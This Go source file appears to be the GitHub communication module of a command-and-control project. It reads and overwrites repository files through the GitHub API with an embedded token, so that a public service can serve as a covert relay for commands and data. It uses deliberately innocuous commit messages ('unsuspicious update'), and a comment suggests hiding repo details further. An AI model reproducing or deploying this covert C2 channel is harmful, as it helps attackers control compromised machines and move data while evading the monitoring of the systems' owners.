package github

import (
	"bytes"
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

var GithubToken string // to be assigned at compile time using ldflags

// in a real implementation you'd wanna hide repo details a little better
const repoOwner = "SurainSaigal"
const repoName = "c2-project-ethical"

// Fetches file from github and returns as string
func ReadFile(filePath string) (string, error) {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", repoOwner, repoName, filePath)

	req, _ := http.NewRequest("GET", apiUrl, nil)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
	req.Header.Set("Accept", "application/vnd.github+json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("API error: %s", resp.Status)
	}

	var result struct {
		Content string `json:"content"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	// clean github response
	cleanedContent := strings.ReplaceAll(result.Content, "\n", "")
	decodedBytes, err := base64.StdEncoding.DecodeString(cleanedContent)
	if err != nil {
		return "", err
	}

	return string(decodedBytes), nil
}

// Overwrites a file on github by creating a commit through github api
func WriteFile(filePath string, prevContent string, newContent string) error {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", repoOwner, repoName, filePath)

	encodedContent := base64.StdEncoding.EncodeToString([]byte(newContent))
	payload := map[string]string{
		"message": "unsuspicious update",
		"content": encodedContent,
		"sha":     calculateGitSHA(prevContent),
	}
	jsonData, _ := json.Marshal(payload)

	req, _ := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(jsonData))
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", GithubToken))
	req.Header.Set("Accept", "application/vnd.github+json")

	updateResp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}
	defer updateResp.Body.Close()

	if updateResp.StatusCode != http.StatusOK && updateResp.StatusCode != http.StatusCreated {
		return fmt.Errorf("failed to update: %s", updateResp.Status)
	}

	return nil
}

// calculateGitSHA generates the exact hash GitHub expects for a file
func calculateGitSHA(content string) string {
	// github expected blob format: "blob <size>\x00<content>"
	header := fmt.Sprintf("blob %d\x00", len(content))
	store := header + content
	hash := sha1.Sum([]byte(store))
	return fmt.Sprintf("%x", hash)
}
